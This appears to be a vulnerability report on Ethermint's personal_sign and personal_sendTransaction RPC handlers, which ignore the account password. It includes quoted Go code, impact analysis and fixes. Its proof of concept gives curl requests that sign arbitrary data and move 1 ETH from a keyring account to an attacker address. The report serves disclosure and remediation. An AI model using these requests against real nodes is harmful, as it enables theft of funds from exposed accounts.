### Title
`personal_sign` and `personal_sendTransaction` Silently Discard Password Parameter, Bypassing Keyring Authorization - (File: `rpc/namespaces/ethereum/personal/api.go`)

### Summary
Ethermint's `personal_sign` and `personal_sendTransaction` JSON-RPC handlers accept a `password` parameter per the Ethereum `personal_*` API specification, but both implementations silently discard it with `_`. The backend signing functions perform no password verification whatsoever. Any caller who can reach the `personal` namespace endpoint can sign arbitrary messages or broadcast transactions from any account held in the node's keyring without knowing the account password.

### Finding Description

The `personal_sign` handler in `rpc/namespaces/ethereum/personal/api.go` is declared as:

```go
func (api *PrivateAccountAPI) Sign(_ context.Context, data hexutil.Bytes, addr common.Address, _ string) (hexutil.Bytes, error) {
    api.logger.Debug("personal_sign", "data", data, "address", addr.String())
    return api.backend.Sign(addr, data)
}
```

The fourth argument — the password — is discarded with `_`. The docstring above the function explicitly states *"The key used to calculate the signature is decrypted with the given password"*, but no decryption or password check ever occurs. [1](#0-0) 

The backend implementation `Backend.Sign` in `rpc/backend/sign_tx.go` only checks that the address exists in the keyring, then immediately signs:

```go
func (b *Backend) Sign(address common.Address, data hexutil.Bytes) (hexutil.Bytes, error) {
    from := sdk.AccAddress(address.Bytes())
    _, err := b.clientCtx.Keyring.KeyByAddress(from)
    if err != nil { ... }
    signature, _, err := b.clientCtx.Keyring.SignByAddress(from, accounts.TextHash(data), ...)
    ...
}
```

No password is passed to `SignByAddress`; the keyring signs unconditionally for any address it holds. [2](#0-1) 

The same pattern applies to `personal_sendTransaction`: the password argument is discarded and `backend.SendTransaction` is called directly, which signs and broadcasts the transaction without any password gate. [3](#0-2) [4](#0-3) 

Additionally, `personal_unlockAccount` is a permanent no-op stub that always returns `false, nil`, so the intended lock/unlock lifecycle that Geth uses to gate `personal_sign` is entirely absent. [5](#0-4) 

The `personal` namespace is registered in `rpc/apis.go` with `Public: false`, but this flag only controls whether the namespace appears in the default HTTP API list — it does not prevent the namespace from being served when an operator explicitly enables it via `--json-rpc.api` or when the server is configured to expose it. [6](#0-5) 

### Impact Explanation

An attacker who can reach the `personal` JSON-RPC endpoint (e.g., a co-located process, a misconfigured firewall, or a node operator who has enabled the namespace for dapp use) can:

1. Call `personal_sign` with any address held in the node keyring and an arbitrary password (including empty string) to obtain a valid EIP-191 signature over attacker-controlled data — without knowing the account password.
2. Call `personal_sendTransaction` with any `from` address held in the node keyring to broadcast a fully signed Ethereum transaction (value transfer, contract call, contract deployment) — without knowing the account password.

This maps to the allowed High impact: *"Ethereum transaction… signer verification bypass enabling… unauthorized account/code mutation"* and *"Public JSON-RPC… exposes a reachable route to the impacts above."*

### Likelihood Explanation

The `personal` namespace is not in the default enabled namespace list, but it is a documented, named namespace that operators routinely enable for development nodes, RPC providers, and dapp backends. The default JSON-RPC bind address is `127.0.0.1:8545`; any local process (including a malicious dapp running on the same host) can reach it. The attack requires only a single unauthenticated JSON-RPC call with no special knowledge.

### Recommendation

1. **Verify the password before signing.** The Cosmos SDK keyring supports password-protected keys. `Backend.Sign` and `Backend.SendTransaction` must accept and verify the password before calling `SignByAddress`. If the underlying keyring backend does not support runtime password verification, the `personal_sign` and `personal_sendTransaction` methods must be disabled or return an explicit error.
2. **Implement `personal_unlockAccount` / `personal_lockAccount`** with a time-bounded in-memory unlock map (as Geth does), so that signing is only permitted for explicitly unlocked accounts within the unlock window.
3. **Remove the misleading docstring** that claims the password is used, or replace it with an explicit notice that the method is unimplemented until the above is fixed.

### Proof of Concept

```bash
# Node has account 0xABCD... in its keyring.
# Attacker calls personal_sign with a wrong/empty password:
curl -X POST http://127.0.0.1:8545 \
  -H "Content-Type: application/json" \
  -d '{
    "jsonrpc":"2.0","method":"personal_sign",
    "params":["0xdeadbeef","0xABCD...","wrongpassword"],
    "id":1
  }'
# Returns a valid 65-byte EIP-191 signature from 0xABCD... — no error.

# Attacker sends a transaction from 0xABCD... to their own address:
curl -X POST http://127.0.0.1:8545 \
  -H "Content-Type: application/json" \
  -d '{
    "jsonrpc":"2.0","method":"personal_sendTransaction",
    "params":[{"from":"0xABCD...","to":"0xATTACKER...","value":"0xDE0B6B3A7640000"},"wrongpassword"],
    "id":2
  }'
# Transaction is signed and broadcast; 1 ETH leaves 0xABCD... — no password check performed.
```

func (b *Backend) SendTransaction(args evmtypes.TransactionArgs) (common.Hash, error) {
	// Look up the wallet containing the requested signer
	_, err := b.clientCtx.Keyring.KeyByAddress(sdk.AccAddress(args.GetFrom().Bytes()))
	if err != nil {
		b.logger.Error("failed to find key in keyring", "address", args.GetFrom(), "error", err.Error())
		return common.Hash{}, fmt.Errorf("failed to find key in the node's keyring; %s; %s", keystore.ErrNoMatch, err.Error())
	}

	if args.ChainID != nil && (b.chainID).Cmp((*big.Int)(args.ChainID)) != 0 {
		return common.Hash{}, fmt.Errorf("chainId does not match node's (have=%v, want=%v)", args.ChainID, (*hexutil.Big)(b.chainID))
	}

	args, err = b.SetTxDefaults(args)
	if err != nil {
		return common.Hash{}, err
	}

	msg := args.ToTransaction()
	if err := msg.ValidateBasic(); err != nil {
		b.logger.Debug("tx failed basic validation", "error", err.Error())
		return common.Hash{}, err
	}

	bn, err := b.BlockNumber()
	if err != nil {
		b.logger.Debug("failed to fetch latest block number", "error", err.Error())
		return common.Hash{}, err
	}

	header, err := b.CurrentHeader()
	if err != nil {
		b.logger.Debug("failed to fetch latest block header", "error", err.Error())
		return common.Hash{}, err
	}

	signer := ethtypes.MakeSigner(b.ChainConfig(), new(big.Int).SetUint64(uint64(bn)), header.Time)

	// Sign transaction
	if err := msg.Sign(signer, b.clientCtx.Keyring); err != nil {
		b.logger.Debug("failed to sign tx", "error", err.Error())
		return common.Hash{}, err
	}

func (b *Backend) Sign(address common.Address, data hexutil.Bytes) (hexutil.Bytes, error) {
	from := sdk.AccAddress(address.Bytes())

	_, err := b.clientCtx.Keyring.KeyByAddress(from)
	if err != nil {
		b.logger.Error("failed to find key in keyring", "address", address.String())
		return nil, fmt.Errorf("%s; %s", keystore.ErrNoMatch, err.Error())
	}

	// Apply EIP-191 signed-message prefix to domain-separate personal
	// signatures from transaction signatures (matching Geth's eth_sign).
	signature, _, err := b.clientCtx.Keyring.SignByAddress(from, accounts.TextHash(data), signingtypes.SignMode_SIGN_MODE_TEXTUAL)
	if err != nil {
		b.logger.Error("keyring.SignByAddress failed", "address", address.Hex())
		return nil, err
	}

	signature[crypto.RecoveryIDOffset] += 27 // Transform V from 0/1 to 27/28 according to the yellow paper
	return signature, nil
}
